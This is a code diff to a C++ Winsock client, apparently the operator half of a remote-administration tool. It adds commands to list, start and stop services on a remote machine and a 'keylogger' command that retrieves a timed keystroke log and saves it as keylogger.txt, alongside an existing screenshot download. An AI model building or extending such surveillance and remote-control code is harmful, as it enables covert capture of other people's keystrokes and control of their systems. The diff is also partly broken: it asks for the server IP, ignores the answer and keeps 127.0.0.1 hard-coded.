@@ -1,4 +1,9 @@
-#include "client.h"
+#include <iostream>
+#include <winsock2.h>
+#include <ws2tcpip.h>
+#include <fstream>
+
+#define bufferSize 1024
 using namespace std;
 
 int main()
@@ -35,7 +40,11 @@ int main()
     cout << "\n===Step 3 - Connect with Server" << endl;
     sockaddr_in clientService;
     clientService.sin_family = AF_INET;
-    clientService.sin_addr.s_addr = inet_addr("127.0.0.1"); //InetPton(AF_INET, L"127.0.0.1", &clientService.sin_addr.s_addr);
+    string IPOfServer ;
+    cout << "Input IPOfServer: ";
+    cin >> IPOfServer;
+    cin.ignore();
+    InetPton(AF_INET, "127.0.0.1", &clientService.sin_addr.s_addr);
     clientService.sin_port = htons(port);
     if (connect(clientSocket, (SOCKADDR*)&clientService, sizeof(clientService)) == SOCKET_ERROR)
     {
@@ -70,7 +79,7 @@ int main()
             // cout << "Expected file size: " << fileSize << " bytes" << endl;
 
             // Step 2: Prepare to receive the file in chunks
-            ofstream outputFile("received_image.bmp", ios::binary);
+            ofstream outputFile("received_image.bmp", ios::binary|ios::out);
             if (!outputFile.is_open()) {
                 cout << "Failed to open file for writing" << endl;
                 break;
@@ -99,13 +108,121 @@ int main()
             outputFile.close();
             cout << "File received and saved as 'received_image.bmp'" << endl;
         }
-        byteCount = recv(clientSocket, messageFromServer, bufferSize, 0);
+        else if (string(messageFromClient) == "listService")
+        {
+            // Step 1: Receive the file size from the server
+            streamsize fileSize;
+            int result = recv(clientSocket, reinterpret_cast<char*>(&fileSize), sizeof(fileSize), 0);
+            if (result <= 0) {
+                cout << "Error receiving file size or connection closed by server" << endl;
+                continue;
+            }
+            cout << "Expected file size: " << fileSize << " bytes" << endl;
 
-        if (byteCount > 0) {
-            cout << "Message received: " << messageFromServer << endl;
+            // Step 2: Prepare to receive the file in chunks and save it as services.txt
+            ofstream outputFile("received_services.txt", ios::binary|ios::out);
+            if (!outputFile.is_open()) {
+                cout << "Failed to open received_services.txt for writing" << endl;
+                continue;
+            }
+
+            // Receive the file content in chunks
+            char fileBuffer[bufferSize];
+            streamsize totalReceived = 0;
+
+            while (totalReceived < fileSize) {
+                int bytesReceived = recv(clientSocket, fileBuffer, bufferSize, 0);
+                if (bytesReceived > 0) {
+                    outputFile.write(fileBuffer, bytesReceived);
+                    totalReceived += bytesReceived;
+                    cout << "Received " << bytesReceived << " bytes (" << totalReceived << "/" << fileSize << ")" << endl;
+                }
+                else if (bytesReceived == 0) {
+                    cout << "Connection closed by server" << endl;
+                    break;
+                }
+                else {
+                    cout << "Error receiving file data: " << WSAGetLastError() << endl;
+                    break;
+                }
+            }
+            outputFile.close();
         }
-        else WSACleanup();
+        else if (string(messageFromClient) == "startService")
+        {
+            string serviceToStart;
+            cout << "Name of service to start: ";
+            getline(cin, serviceToStart);
+            send(clientSocket, serviceToStart.c_str(), bufferSize, 0);
+            byteCount = recv(clientSocket, messageFromServer, bufferSize, 0);
+
+            if (byteCount > 0) {
+                cout << "Message received: " << messageFromServer << endl;
+            }
+        }
+        else if (string(messageFromClient) == "stopService")
+        {
+            string serviceToStop;
+            cout << "Name of service to stop: ";
+            getline(cin, serviceToStop);
+            send(clientSocket, serviceToStop.c_str(), bufferSize, 0);
+            byteCount = recv(clientSocket, messageFromServer, bufferSize, 0);
+
+            if (byteCount > 0) {
+                cout << "Message received: " << messageFromServer << endl;
+            }
+        }
+        else if (string(messageFromClient) == "keylogger")
+        {
+            string time;
+            cout << "Input time(second): ";
+            getline(cin, time);
+            send(clientSocket, time.c_str(), bufferSize, 0);
+            streamsize fileSize;
+            int result = recv(clientSocket, reinterpret_cast<char*>(&fileSize), sizeof(fileSize), 0);
+            if (result <= 0) {
+                cout << "Error receiving file size or connection closed by server" << endl;
+                continue;
+            }
+            cout << "Expected file size: " << fileSize << " bytes" << endl;
+
+            // Step 2: Prepare to receive the file in chunks and save it as services.txt
+            ofstream outputFile("keylogger.txt", ios::binary|ios::out);
+            if (!outputFile.is_open()) {
+                cout << "Failed to open keylogger.txt for writing" << endl;
+                continue;
+            }
+
+            // Receive the file content in chunks
+            char fileBuffer[bufferSize];
+            streamsize totalReceived = 0;
+
+            while (totalReceived < fileSize) {
+                int bytesReceived = recv(clientSocket, fileBuffer, bufferSize, 0);
+                if (bytesReceived > 0) {
+                    outputFile.write(fileBuffer, bytesReceived);
+                    totalReceived += bytesReceived;
+                    cout << "Received " << bytesReceived << " bytes (" << totalReceived << "/" << fileSize << ")" << endl;
+                }
+                else if (bytesReceived == 0) {
+                    cout << "Connection closed by server" << endl;
+                    break;
+                }
+                else {
+                    cout << "Error receiving file data: " << WSAGetLastError() << endl;
+                    break;
+                }
+            }
+            outputFile.close();         
+        }
+        // byteCount = recv(clientSocket, messageFromServer, bufferSize, 0);
+
+        // if (byteCount > 0) {
+        //     cout << "Message received: " << messageFromServer << endl;
+        // }
+        // else WSACleanup();
     }
+
 
     system("pause");
     WSACleanup();
